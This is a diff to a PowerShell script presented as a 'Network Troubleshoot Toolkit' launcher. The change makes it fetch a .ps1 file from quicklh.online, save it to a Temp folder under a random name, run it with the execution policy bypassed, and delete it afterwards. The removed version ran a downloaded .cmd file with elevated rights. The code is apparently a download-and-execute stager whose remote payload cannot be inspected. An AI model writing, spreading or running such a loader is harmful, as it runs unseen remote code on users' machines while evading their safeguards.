@@ -30,10 +30,10 @@ if (-not $args) {
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     $URLs = @(
-        "https://quicklh.online/NetworkTroubleshoot.cmd",
-        "https://quicklh.online/NetworkTroubleshoot/NetworkTroubleshoot.cmd",
-        "http://quicklh.online/NetworkTroubleshoot.cmd",
-        "http://quicklh.online/NetworkTroubleshoot/NetworkTroubleshoot.cmd"
+        "https://quicklh.online/NetworkTroubleshoot.ps1",
+        "https://quicklh.online/NetworkTroubleshoot/NetworkTroubleshoot.ps1",
+        "http://quicklh.online/NetworkTroubleshoot.ps1",
+        "http://quicklh.online/NetworkTroubleshoot/NetworkTroubleshoot.ps1"
     )
     Write-Progress -Activity "Downloading..." -Status "Please wait"
     $errors = @()
@@ -66,7 +66,7 @@ if (-not $args) {
 
     $rand = [Guid]::NewGuid().Guid
     $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-    $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\NetworkTool_$rand.cmd" } else { "$env:USERPROFILE\AppData\Local\Temp\NetworkTool_$rand.cmd" }
+    $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\NetworkTool_$rand.ps1" } else { "$env:USERPROFILE\AppData\Local\Temp\NetworkTool_$rand.ps1" }
     Set-Content -Path $FilePath -Value $response
 
     if (-not (Test-Path $FilePath)) {
@@ -74,15 +74,8 @@ if (-not $args) {
         throw
     }
 
-    $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
-    
-    if ($psv -lt 3) {
-        $p = saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath""""" -Verb RunAs -PassThru
-        $p.WaitForExit()
-    }
-    else {
-        saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath""""" -Wait -Verb RunAs
-    }
+    Write-Host "Launching Network Troubleshoot Toolkit..." -ForegroundColor Cyan
+    & powershell.exe -ExecutionPolicy Bypass -File $FilePath
 
     if (Test-Path $FilePath) {
         Remove-Item -Path $FilePath
